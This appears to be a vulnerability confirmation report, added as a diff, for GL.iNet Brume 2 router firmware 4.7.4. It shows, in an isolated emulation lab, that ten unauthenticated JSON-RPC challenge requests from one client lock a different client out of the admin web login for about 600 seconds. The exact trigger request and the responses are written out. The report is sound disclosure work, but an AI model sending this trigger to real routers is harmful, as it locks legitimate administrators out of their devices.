@@ -1,0 +1,86 @@
+GL.iNet GL-MT2500/GL-MT2500A Brume 2 4.7.4
+Two-client native HTTP emulation confirmation
+Date: 2026-07-24 UTC
+
+Firmware
+--------
+File: openwrt-mt2500-4.7.4-0328-1743128340.bin
+SHA-256: 3de78f88a2cc204c089cd1c262346786796d43a223564b1f792f3e8515cc8904
+gl-ngx-session SHA-256:
+4df035e835092fcbb652fa68c6e835f7cb9e6a1373b8d29585f738b5d3f643e4
+
+Topology
+--------
+Internal Docker network only; no host port published.
+Router:   172.24.0.2
+Client A: 172.24.0.3
+Client B: 172.24.0.4
+
+Native firmware components
+--------------------------
+/sbin/ubusd
+/usr/bin/eco /usr/sbin/gl-ngx-session
+/usr/sbin/nginx -c /etc/nginx/oui_nginx.conf
+
+QEMU user-mode supplied only the AArch64 CPU translation layer. The firmware's
+own dynamic loader, libraries, Nginx/OpenResty modules, Lua RPC route, Ubus
+daemon, Eco runtime, and session script were used.
+
+A lab-only SHA-512 root credential and one-day TLS certificate were added to
+the temporary copy. The extracted source firmware was not modified.
+
+Baseline from client B
+----------------------
+Request:
+{"method":"challenge","params":{"username":"root"}}
+
+Response:
+{"id":null,"jsonrpc":"2.0","result":{"salt":"FridayLab","alg":6,"nonce":"3t1RWPKNFCbSkKwgho4D7CAWWN3wduzl"}}
+
+Unauthenticated trigger from client A
+-------------------------------------
+Ten requests:
+{"method":"challenge","params":{"username":"attacker"}}
+
+Each request returned:
+{"id":null,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}
+
+Cross-client impact
+-------------------
+Client B then requested a legitimate root challenge:
+{"id":null,"jsonrpc":"2.0","error":{"message":"Login fail number over limit","data":{"wait":600},"code":-32003}}
+
+The valid root response for the baseline nonce was computed as:
+MD5("root:<temporary-shadow-hash>:3t1RWPKNFCbSkKwgho4D7CAWWN3wduzl")
+= 8d0800f709d7659a54821bcf024f20a3
+
+Client B submitted that response:
+{"method":"login","params":{"username":"root","hash":"8d0800f709d7659a54821bcf024f20a3"}}
+
+Response:
+{"id":null,"jsonrpc":"2.0","error":{"message":"Login fail number over limit","data":{"wait":580},"code":-32003}}
+
+An additional incorrect login response was submitted after the lockout and
+before the correctly computed response. It did not create or extend the
+lockout: the lockout had already been observed at 600 seconds after the ten
+challenge requests, and the later valid-response result showed 580 seconds
+remaining.
+
+Availability controls
+---------------------
+Ordinary HTTP after the trigger:
+status=200 time=0.041311
+
+Native service state:
+UBUS_SOCKET=alive
+ubusd PID 76: alive
+gl-ngx-session PID 83: alive
+nginx master PID 90: alive
+
+Conclusion
+----------
+Confirmed in native end-to-end HTTP emulation: ten unauthenticated requests
+from one network client impose a process-global authentication lockout on a
+different client for approximately 600 seconds. The affected service is the
+administrative WebUI authentication plane. This is not evidence of a
+whole-router forwarding DoS or unauthenticated RCE.
